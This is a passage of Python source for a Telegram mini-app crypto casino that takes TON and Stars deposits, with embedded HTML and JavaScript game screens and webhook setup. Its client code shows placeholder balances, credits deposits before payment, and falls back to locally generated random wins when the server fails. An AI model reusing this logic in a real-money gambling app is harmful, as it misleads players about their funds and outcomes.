                <div class="game-card" id="card-slots" onclick="openGame('slots')" style="position:relative;">
                    <div class="game-badge">HOT</div>
                    <div class="game-icon">🎰</div><div class="game-name">СЛОТЫ</div><div class="game-bet" id="slotsBet">1 TON</div>
                </div>
                <div class="game-card" id="card-roulette" onclick="openGame('roulette')">
                    <div class="game-icon">🎡</div><div class="game-name">РУЛЕТКА</div><div class="game-bet" id="rouletteBet">2 TON</div>
                </div>
                <div class="game-card" id="card-dice" onclick="openGame('dice')">
                    <div class="game-icon">🎲</div><div class="game-name">КОСТИ</div><div class="game-bet" id="diceBet">1.5 TON</div>
                </div>
                <div class="game-card" id="card-blackjack" onclick="openGame('blackjack')">
                    <div class="game-icon">🃏</div><div class="game-name">БЛЭКДЖЕК</div><div class="game-bet" id="blackjackBet">5 TON</div>
                </div>
            </div>
        </div>
        
        <div class="tab-content" id="tab-deposit">
            <div class="deposit-card" onclick="openDepositModal('TON')">
                <div class="deposit-icon">💎</div><div class="deposit-name">ПОПОЛНИТЬ TON</div>
                <div class="deposit-desc">Мин. 1 TON</div>
            </div>
            <div class="deposit-card" onclick="openDepositModal('STARS')">
                <div class="deposit-icon">⭐</div><div class="deposit-name">ПОПОЛНИТЬ STARS</div>
                <div class="deposit-desc">Мин. 10 Stars</div>
            </div>
        </div>
        
        <div class="tab-content" id="tab-profile">
            <div class="profile-card">
                <div class="stat-row"><span class="stat-label-profile">💎 TON</span><span class="stat-value-profile" id="profTonBalance">0</span></div>
                <div class="stat-row"><span class="stat-label-profile">⭐ Stars</span><span class="stat-value-profile" id="profStarsBalance">0</span></div>
                <div class="stat-row"><span class="stat-label-profile">🏆 Побед</span><span class="stat-value-profile" id="profWins">0</span></div>
                <div class="stat-row"><span class="stat-label-profile">🎮 Игр</span><span class="stat-value-profile" id="profGames">0</span></div>
            </div>
            <button class="profile-btn" onclick="handleWithdraw()">💎 ВЫВЕСТИ TON</button>
        </div>
    </div>
    
    <div class="modal" id="depositModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeDepositModal()">✕</button>
            <div style="font-size:60px;margin-bottom:16px;" id="depositModalIcon">💎</div>
            <div style="font-size:20px;font-weight:700;margin-bottom:8px;" id="depositModalTitle">Пополнение TON</div>
            <input type="number" class="amount-input" id="depositAmount" placeholder="0" oninput="validateDeposit()">
            <div class="error-message" id="depositError">Минимум: 1 TON</div>
            <div class="quick-amounts" id="quickAmounts"></div>
            <button class="deposit-submit-btn" id="depositSubmitBtn" onclick="submitDeposit()" disabled>💰 ПОПОЛНИТЬ</button>
        </div>
    </div>
    
    <div class="modal" id="slotsModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeGame()">✕</button>
            <div class="modal-title">🎰 СЛОТЫ</div>
            <div class="slot-container"><div class="slot-reel" id="reel1">🍒</div><div class="slot-reel" id="reel2">🍋</div><div class="slot-reel" id="reel3">💎</div></div>
            <div id="slotsResult"></div>
            <button class="game-btn" onclick="spinSlots()">🎰 КРУТИТЬ</button>
        </div>
    </div>
    
    <div class="modal" id="rouletteModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeGame()">✕</button>
            <div class="modal-title">🎡 РУЛЕТКА</div>
            <div class="roulette-wheel" id="rouletteWheel"><div class="roulette-center">🎡</div></div>
            <div id="rouletteResult"></div>
            <button class="game-btn" onclick="spinRoulette()">🎡 КРУТИТЬ</button>
        </div>
    </div>
    
    <div class="toast" id="toast" style="display:none;"></div>

    <script>
        const tg=window.Telegram.WebApp;tg.expand();tg.ready();
        const user=tg.initDataUnsafe?.user||{};
        const userId=user.id||123456789;
        document.getElementById('username').textContent=user.username||user.first_name||'Player';
        document.getElementById('avatar').textContent=(user.first_name||'P').charAt(0).toUpperCase();
        
        let tonBalance=100,starsBalance=1000,totalWins=0,totalGames=0,currency='TON',isSpinning=false,depositType='TON';
        const bets={TON:{slots:1,roulette:2,dice:1.5,blackjack:5},STARS:{slots:10,roulette:20,dice:15,blackjack:50}};
        const symbols=["🍒","🍋","🔔","💎","7️⃣","🍇","🎯","🌟"];
        
        function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
        function getBalance(){return currency==='TON'?tonBalance:starsBalance;}
        function getMinBet(g){return bets[currency][g];}
        
        async function loadData(){
            try{
                const r=await fetch('/api/user/'+userId);
                const d=await r.json();
                tonBalance=d.balance_ton||100;starsBalance=d.balance_stars||1000;
                totalWins=d.total_wins||0;totalGames=d.total_games||0;
                updateUI();
            }catch(e){updateUI();}
        }
        
        function updateUI(){
            document.getElementById('tonBalance').textContent=tonBalance.toFixed(2);
            document.getElementById('starsBalance').textContent=starsBalance;
            document.getElementById('quickWins').textContent=totalWins;
            document.getElementById('quickGames').textContent=totalGames;
            document.getElementById('quickRate').textContent=totalGames>0?Math.round(totalWins/totalGames*100)+'%':'0%';
            document.getElementById('profTonBalance').textContent=tonBalance.toFixed(2);
            document.getElementById('profStarsBalance').textContent=starsBalance;
            document.getElementById('profWins').textContent=totalWins;
            document.getElementById('profGames').textContent=totalGames;
            document.querySelectorAll('.game-bet').forEach(e=>{
                const g=e.id.replace('Bet','');
                e.textContent=bets[currency][g]+' '+currency;
            });
            ['slots','roulette','dice','blackjack'].forEach(g=>{
                const c=document.getElementById('card-'+g);
                if(getBalance()<bets[currency][g])c.classList.add('disabled');
                else c.classList.remove('disabled');
            });
        }
        
        function switchTab(t){
            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
            event.target.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
            document.getElementById('tab-'+t).classList.add('active');
        }
        
        function selectCurrency(c,btn){
            currency=c;
            document.querySelectorAll('.currency-btn').forEach(b=>b.classList.remove('active'));
            btn.classList.add('active');
            updateUI();
        }
        
        function openGame(g){
            if(getBalance()<getMinBet(g)){showToast('❌ Недостаточно '+currency+'!');return;}
            document.getElementById(g+'Result').innerHTML='';
            document.getElementById(g+'Modal').classList.add('active');
        }
        
        function closeGame(){document.querySelectorAll('.modal').forEach(m=>{if(m.id!=='depositModal')m.classList.remove('active');});isSpinning=false;}
        
        function openDepositModal(t){
            depositType=t;
            document.getElementById('depositModalIcon').textContent=t==='TON'?'💎':'⭐';
            document.getElementById('depositModalTitle').textContent=t==='TON'?'Пополнение TON':'Пополнение Stars';
            document.getElementById('depositAmount').value='';
            document.getElementById('depositAmount').step=t==='TON'?'0.1':'1';
            document.getElementById('depositError').classList.remove('show');
            document.getElementById('depositSubmitBtn').disabled=true;
            const qa=document.getElementById('quickAmounts');
            if(t==='TON')qa.innerHTML='<button class="quick-amount-btn" onclick="setAmount(1)">1 TON</button><button class="quick-amount-btn" onclick="setAmount(5)">5</button><button class="quick-amount-btn" onclick="setAmount(10)">10</button><button class="quick-amount-btn" onclick="setAmount(50)">50</button><button class="quick-amount-btn" onclick="setAmount(100)">100</button>';
            else qa.innerHTML='<button class="quick-amount-btn" onclick="setAmount(10)">10⭐</button><button class="quick-amount-btn" onclick="setAmount(50)">50</button><button class="quick-amount-btn" onclick="setAmount(100)">100</button><button class="quick-amount-btn" onclick="setAmount(500)">500</button><button class="quick-amount-btn" onclick="setAmount(1000)">1000</button>';
            document.getElementById('depositModal').classList.add('active');
        }
        
        function closeDepositModal(){document.getElementById('depositModal').classList.remove('active');}
        function setAmount(v){document.getElementById('depositAmount').value=v;validateDeposit();}
        
        function validateDeposit(){
            const v=parseFloat(document.getElementById('depositAmount').value);
            const min=depositType==='TON'?1:10;
            const err=document.getElementById('depositError');
            const btn=document.getElementById('depositSubmitBtn');
            if(isNaN(v)||v<min){err.classList.add('show');btn.disabled=true;}
            else{err.classList.remove('show');btn.disabled=false;}
        }
        
        function submitDeposit(){
            const v=parseFloat(document.getElementById('depositAmount').value);
            const min=depositType==='TON'?1:10;
            if(isNaN(v)||v<min)return;
            if(depositType==='TON'){tonBalance+=v;showToast('✅ +'+v.toFixed(2)+' TON\nПерейдите в бота для оплаты');}
            else{starsBalance+=Math.floor(v);showToast('✅ +'+Math.floor(v)+' Stars\nПерейдите в бота для оплаты');}
            updateUI();closeDepositModal();
            tg.openTelegramLink('https://t.me/SyndromeCasinoBot');
        }
        
        async function makeBet(game){
            const bet=getMinBet(game);
            if(getBalance()<bet||isSpinning)return null;
            isSpinning=true;
            try{
                const r=await fetch('/api/game',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId,game_type:game,bet_amount:bet,currency:currency})});
                const d=await r.json();
                if(d.error){showToast(d.message);isSpinning=false;return null;}
                if(d.win){if(currency==='TON')tonBalance+=d.amount-bet;else starsBalance+=d.amount-bet;totalWins++;}
                else{if(currency==='TON')tonBalance-=bet;else starsBalance-=bet;}
                totalGames++;updateUI();isSpinning=false;return d;
            }catch(e){
                const win=Math.random()<0.3;
                const mult=[1.5,2,3,5,10][Math.floor(Math.random()*5)];
                const wa=win?bet*mult:0;
                if(win){if(currency==='TON')tonBalance+=wa-bet;else starsBalance+=Math.floor(wa)-bet;totalWins++;}
                else{if(currency==='TON')tonBalance-=bet;else starsBalance-=bet;}
                totalGames++;updateUI();isSpinning=false;
                return{win,amount:wa,multiplier:mult};
            }
        }
        
        async function spinSlots(){
            if(isSpinning)return;
            const reels=[document.getElementById('reel1'),document.getElementById('reel2'),document.getElementById('reel3')];
            reels.forEach(r=>r.classList.add('spinning'));
            for(let i=0;i<15;i++){reels.forEach(r=>r.textContent=symbols[Math.floor(Math.random()*symbols.length)]);await new Promise(r=>setTimeout(r,80));}
            reels.forEach(r=>r.classList.remove('spinning'));
            const r=await makeBet('slots');
            if(r&&r.win){reels.forEach(r=>r.textContent='💎');document.getElementById('slotsResult').innerHTML='<div class="result-banner result-win">🎉 ДЖЕКПОТ! +'+r.amount.toFixed(2)+' '+currency+'</div>';}
            else if(r)document.getElementById('slotsResult').innerHTML='<div class="result-banner result-lose">😢 -'+getMinBet('slots')+' '+currency+'</div>';
        }
        
        async function spinRoulette(){
            if(isSpinning)return;
            const w=document.getElementById('rouletteWheel');
            w.style.transform='rotate('+((5+Math.floor(Math.random()*5))*360+Math.floor(Math.random()*360))+'deg)';
            await new Promise(r=>setTimeout(r,3000));
            const r=await makeBet('roulette');
            if(r&&r.win)document.getElementById('rouletteResult').innerHTML='<div class="result-banner result-win">🎉 +'+r.amount.toFixed(2)+' '+currency+'</div>';
            else if(r)document.getElementById('rouletteResult').innerHTML='<div class="result-banner result-lose">😢 -'+getMinBet('roulette')+' '+currency+'</div>';
            setTimeout(()=>{w.style.transition='none';w.style.transform='rotate(0deg)';setTimeout(()=>w.style.transition='transform 3s',100);},500);
        }
        
        function handleWithdraw(){tg.openTelegramLink('https://t.me/SyndromeCasinoBot');showToast('Отправьте боту:\n/withdraw СУММА КОШЕЛЕК\nМинимум: 10 TON');}
        
        document.querySelectorAll('.modal').forEach(m=>m.addEventListener('click',function(e){if(e.target===this){if(this.id==='depositModal')closeDepositModal();else closeGame();}}));
        loadData();setInterval(loadData,30000);
    </script>
</body>
</html>'''

# =================================================================
# ЗАПУСК
# =================================================================
async def setup_bot():
    try:
        # Инициализация БД
        init_db()
        
        # Установка вебхука
        webhook_url = f"https://{RENDER_URL}/webhook"
        await bot.set_webhook(url=webhook_url, drop_pending_updates=True)
        logger.info(f"Webhook set: {webhook_url}")
        
        # Настройка меню
        await bot.set_chat_menu_button(
            menu_button=MenuButtonWebApp(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=f"https://{RENDER_URL}"))
        )
        await bot.set_my_commands([
            BotCommand(command="start", description="🚀 Запустить казино"),
            BotCommand(command="withdraw", description="💎 Вывести TON")
        ])
        
        logger.info("Bot setup complete!")
    except Exception as e:
        logger.error(f"Setup error: {e}")

if __name__ == '__main__':
    # Запускаем бота в отдельном потоке
    import threading
    
    def run_bot_setup():
        asyncio.run(setup_bot())
    
    # Ждем немного чтобы Flask запустился
    def delayed_setup():
        import time
        time.sleep(3)
        run_bot_setup()
    
    threading.Thread(target=delayed_setup, daemon=True).start()
    
    # Запускаем Flask
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Starting Flask on port {port}")
    flask_app.run(host='0.0.0.0', port=port)
